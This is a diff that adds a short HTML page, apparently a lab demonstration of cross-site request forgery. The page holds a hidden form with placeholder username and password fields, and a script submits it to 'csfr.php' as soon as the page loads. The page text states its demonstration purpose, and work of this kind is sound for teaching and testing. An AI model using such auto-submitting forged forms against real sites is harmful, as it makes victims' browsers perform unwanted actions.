@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF forged request</title>
+</head>
+<body>
+    <p>This page auto-submits a hidden form to <code>csfr.php</code> as soon as it loads (CSRF demonstration).</p>
+    <form id="forge" method="post" action="csfr.php">
+        <input type="hidden" name="username" value="host">
+        <input type="hidden" name="password" value="pass">
+    </form>
+    <script>
+        document.getElementById('forge').submit();
+    </script>
+</body>
+</html>
